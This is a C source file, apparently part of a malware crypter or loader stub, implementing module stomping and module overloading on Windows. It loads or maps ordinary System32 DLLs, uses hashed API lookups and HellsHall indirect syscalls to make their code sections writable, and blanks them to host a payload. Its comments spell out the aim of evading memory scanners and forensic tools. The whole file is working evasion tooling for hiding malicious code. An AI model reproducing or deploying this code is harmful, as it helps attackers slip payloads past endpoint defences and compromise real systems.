#include "ModuleStomping.h"
#include "Common.h"
#include "Syscalls.h"
#include "ApiHashing.h"
#include "..\Engine\NtApi.h"

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x1000000
#endif

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

/* Syscall + VirtualAlloc/Free typedefs — used only within this translation unit */
typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef LPVOID   (WINAPI *pfnVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL     (WINAPI *pfnVirtualFree_t)(LPVOID, SIZE_T, DWORD);

/* 10-DLL lookup table — indices match the layout documented in ModuleStomping.h.
 * Builder stores 3 chosen indices in .rsrc; Stub resolves names here at runtime.
 * No DLL name appears in the .rsrc payload — only 3 opaque bytes. */
const wchar_t* g_DllPool[10] = {
    L"xpsservices.dll",  /* 0 — PRINT  */
    L"msi.dll",          /* 1 — PRINT  */
    L"dbghelp.dll",      /* 2 — PRINT  */
    L"winmm.dll",        /* 3 — MEDIA  */
    L"dxgi.dll",         /* 4 — MEDIA  */
    L"oleaut32.dll",     /* 5 — MEDIA  */
    L"winhttp.dll",      /* 6 — NETWORK */
    L"wtsapi32.dll",     /* 7 — NETWORK */
    L"wlanapi.dll",      /* 8 — NETWORK */
    L"bcrypt.dll",       /* 9 — CRYPTO  */
};

/* ModuleStomp_Alloc
 *
 * Loads the three DLLs identified by dll_indices and overwrites the first
 * executable section large enough to hold dwSize bytes.
 *
 * Original bytes are saved in a VirtualAlloc'd buffer (*ppOriginalBytes) so
 * the caller can restore them after the payload is wiped.  Restoration:
 *   1. custom_memcpy(execBuf, *ppOriginalBytes, *pOriginalBytesSz)
 *   2. NtProtect(execBuf, PAGE_EXECUTE_READ)  — drop the write bit
 *   3. VirtualFree(*ppOriginalBytes, ...)     — release save buffer
 *
 * Without restoration:
 *   - DEP violation: any code calling into the stomped DLL triggers an
 *     EXCEPTION_ACCESS_VIOLATION (ExceptionInformation[0] = 8) because the
 *     section has been left as PAGE_READWRITE (no execute bit).
 *   - Forensic artifact: a memory scanner sees a DLL's .text section full of
 *     zeros rather than valid code — an obvious anomaly.
 */
PVOID ModuleStomp_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
                        PVOID* ppOriginalBytes, SIZE_T* pOriginalBytesSz)
{
    if (dwSize == 0) return NULL;

    /* Initialise caller-supplied out-params to safe defaults */
    if (ppOriginalBytes)  *ppOriginalBytes  = NULL;
    if (pOriginalBytesSz) *pOriginalBytesSz = 0;

    /* Resolve NtProtectVirtualMemory SSN + trampoline (HellsHall) */
    DWORD dwSsn       = 0;
    PVOID pTrampoline = NULL;
    if (!Syscalls_GetParamsByHash(g_Hash_ZwProtectVirtualMemory, &dwSsn, &pTrampoline))
        return NULL;

    pfnNtProtectVirtualMemory_t Sys_NtProtect = (pfnNtProtectVirtualMemory_t)HellsHallSyscall;

    /* Resolve VirtualAlloc / VirtualFree for the save-buffer allocation.
     * These are the only kernel32 exports used directly here. */
    HMODULE          hKernel32   = GetModuleHandleH(g_Hash_kernel32);
    pfnVirtualAlloc_t pVirtAlloc = (pfnVirtualAlloc_t)GetProcAddressH(hKernel32, g_Hash_VirtualAlloc);
    pfnVirtualFree_t  pVirtFree  = (pfnVirtualFree_t)GetProcAddressH(hKernel32, g_Hash_VirtualFree);

    /* Iterate over the 3 caller-supplied indices, resolving DLL names from
     * g_DllPool at runtime.  Invalid indices (>= 10) are skipped safely. */
    for (int i = 0; i < 3; i++) {
        BYTE idx = dll_indices[i];
        if (idx >= 10) continue;              /* guard against corrupt .rsrc */

        HMODULE hModule = LoadLibraryW(g_DllPool[idx]);
        if (!hModule) continue;

        PBYTE pBase = (PBYTE)hModule;
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) continue;

        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
        if (pNt->Signature != IMAGE_NT_SIGNATURE) continue;

        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
        PVOID pTargetMem = NULL;

        for (int j = 0; j < pNt->FileHeader.NumberOfSections; j++) {
            if ((pSection[j].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                 pSection[j].Misc.VirtualSize >= dwSize) {
                pTargetMem = pBase + pSection[j].VirtualAddress;
                break;
            }
        }

        if (!pTargetMem) continue;

        /* ----------------------------------------------------------------
         * Save the original .text bytes BEFORE stomping.
         *
         * If VirtualAlloc fails (extremely rare), we still proceed without
         * the save — restoration will be skipped in Stub.cpp (NULL check).
         * ---------------------------------------------------------------- */
        PVOID pSaveBuf = NULL;
        if (pVirtAlloc)
            pSaveBuf = pVirtAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pSaveBuf)
            custom_memcpy(pSaveBuf, pTargetMem, dwSize);

        /* Flip .text section: RX → RW to allow payload write */
        DWORD  dwOld      = 0;
        PVOID  pBase2     = pTargetMem;
        SIZE_T regionSize = dwSize;

		SetSyscallParams(dwSsn, pTrampoline);
        NTSTATUS st = Sys_NtProtect((HANDLE)-1, &pBase2, &regionSize,PAGE_READWRITE, &dwOld);

        if (!NT_SUCCESS(st)) {
            /* Protection flip failed — release save buffer and try next DLL */
            if (pSaveBuf && pVirtFree)
                pVirtFree(pSaveBuf, 0, MEM_RELEASE);
            continue;
        }

        /* Zero the region; caller will copy the payload in next */
        custom_memset(pTargetMem, 0, dwSize);

        /* Hand save buffer to caller */
        if (ppOriginalBytes)  *ppOriginalBytes  = pSaveBuf;
        if (pOriginalBytesSz) *pOriginalBytesSz = dwSize;

        return pTargetMem;
    }
    return NULL;
}

/* ModuleOverload_Alloc
 *
 * Maps a fresh copy of a pool DLL via NtCreateSection(SEC_IMAGE) + NtMapViewOfSection.
 * The resulting memory is disk-backed (Type = MEM_IMAGE, backing = DLL file on disk)
 * and is NOT registered in PEB LDR — DllMain is never called.
 * Memory forensics tools see it as a legitimately loaded image, not an anonymous
 * allocation.  COW semantics ensure the on-disk file is never modified.
 */
PVOID ModuleOverload_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
                           PVOID* ppOriginalBytes, SIZE_T* pOriginalBytesSz,
                           PVOID* ppViewBase)
{
    if (dwSize == 0) return NULL;

    if (ppOriginalBytes)  *ppOriginalBytes  = NULL;
    if (pOriginalBytesSz) *pOriginalBytesSz = 0;
    if (ppViewBase)       *ppViewBase       = NULL;

    DWORD dwSsn       = 0;
    PVOID pTrampoline = NULL;
    if (!Syscalls_GetParamsByHash(g_Hash_ZwProtectVirtualMemory, &dwSsn, &pTrampoline))
        return NULL;

    pfnNtProtectVirtualMemory_t Sys_NtProtect = (pfnNtProtectVirtualMemory_t)HellsHallSyscall;

    HMODULE           hKernel32  = GetModuleHandleH(g_Hash_kernel32);
    pfnVirtualAlloc_t pVirtAlloc = (pfnVirtualAlloc_t)GetProcAddressH(hKernel32, g_Hash_VirtualAlloc);
    pfnVirtualFree_t  pVirtFree  = (pfnVirtualFree_t)GetProcAddressH(hKernel32, g_Hash_VirtualFree);

    /* Get system directory once — used to build full DLL paths */
    WCHAR sysDir[MAX_PATH];
    if (!GetSystemDirectoryW(sysDir, MAX_PATH)) return NULL;

    for (int i = 0; i < 3; i++) {
        BYTE idx = dll_indices[i];
        if (idx >= 10) continue;

        /* Build full path:  C:\Windows\System32\<dllname>  without wcscat/wcscpy */
        WCHAR dllPath[MAX_PATH];
        int k = 0;
        for (; sysDir[k] && k < MAX_PATH - 2; k++) dllPath[k] = sysDir[k];
        dllPath[k++] = L'\\';
        const wchar_t* name = g_DllPool[idx];
        for (int m = 0; name[m] && k < MAX_PATH - 1; m++, k++) dllPath[k] = name[m];
        dllPath[k] = L'\0';

        /* Open a read handle to the DLL file — needed for NtCreateSection(SEC_IMAGE) */
        HANDLE hFile = CreateFileW(dllPath, GENERIC_READ,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
                                   NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        /* Create a SEC_IMAGE section backed by the DLL file.
         * PAGE_READONLY + SEC_IMAGE: page protections come from PE section characteristics
         * (COW semantics apply when we write via NtProtect+write later). */
        HANDLE   hSection = NULL;
        NTSTATUS st = pNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE,
                                       NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
        CloseHandle(hFile);
        if (!NT_SUCCESS(st) || !hSection) continue;

        /* Map the section into our process — disk-backed, not in PEB LDR */
        PVOID  pBase    = NULL;
        SIZE_T viewSize = 0;
        st = pNtMapViewOfSection(hSection, (HANDLE)-1, &pBase,
                                 0, 0, NULL, &viewSize, 1 /* ViewShare */, 0, PAGE_READONLY);
        pNtClose(hSection);
        if (!NT_SUCCESS(st) || !pBase) continue;

        /* Walk PE sections to find a large enough executable section */
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
            pNtUnmapViewOfSection((HANDLE)-1, pBase);
            continue;
        }
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pBase + pDos->e_lfanew);
        if (pNt->Signature != IMAGE_NT_SIGNATURE) {
            pNtUnmapViewOfSection((HANDLE)-1, pBase);
            continue;
        }

        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
        PVOID pTargetMem = NULL;
        for (int j = 0; j < pNt->FileHeader.NumberOfSections; j++) {
            if ((pSection[j].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                 pSection[j].Misc.VirtualSize >= dwSize) {
                pTargetMem = (PBYTE)pBase + pSection[j].VirtualAddress;
                break;
            }
        }

        if (!pTargetMem) {
            pNtUnmapViewOfSection((HANDLE)-1, pBase);
            continue;
        }

        /* Save original .text bytes before overwriting */
        PVOID pSaveBuf = NULL;
        if (pVirtAlloc)
            pSaveBuf = pVirtAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pSaveBuf)
            custom_memcpy(pSaveBuf, pTargetMem, dwSize);

        /* Flip .text: RX → RW (COW — private pages created, backing file unchanged) */
        DWORD  dwOld      = 0;
        PVOID  pBase2     = pTargetMem;
        SIZE_T regionSize = dwSize;
        SetSyscallParams(dwSsn, pTrampoline);
        st = Sys_NtProtect((HANDLE)-1, &pBase2, &regionSize, PAGE_READWRITE, &dwOld);

        if (!NT_SUCCESS(st)) {
            if (pSaveBuf && pVirtFree) pVirtFree(pSaveBuf, 0, MEM_RELEASE);
            pNtUnmapViewOfSection((HANDLE)-1, pBase);
            continue;
        }

        custom_memset(pTargetMem, 0, dwSize);

        if (ppOriginalBytes)  *ppOriginalBytes  = pSaveBuf;
        if (pOriginalBytesSz) *pOriginalBytesSz = dwSize;
        if (ppViewBase)       *ppViewBase        = pBase;

        return pTargetMem;
    }
    return NULL;
}
